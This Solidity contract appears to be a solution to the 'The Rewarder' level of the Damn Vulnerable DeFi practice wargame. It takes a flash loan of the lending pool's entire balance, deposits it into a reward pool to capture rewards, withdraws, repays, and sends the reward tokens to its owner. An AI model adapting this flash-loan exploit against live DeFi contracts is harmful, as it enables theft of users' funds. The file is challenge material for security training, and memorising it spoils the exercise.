pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";



contract AttackRewarder {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rwPool;
    address owner;

    constructor(address poolAddress, address liquidityTokenPool, address rewardPoolAddress, address _owner) {
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenPool);
        rwPool = TheRewarderPool(rewardPoolAddress);
        owner = _owner;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        
        uint256 amount = liquidityToken.balanceOf(address(pool));

        pool.flashLoan(amount);
    }


    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rwPool), amount);

        rwPool.deposit(amount);
        rwPool.withdraw(amount);


        liquidityToken.transfer(address(pool), amount);

        uint256 val = rwPool.rewardToken().balanceOf(address(this));

        rwPool.rewardToken().transfer(owner, val);


    }
}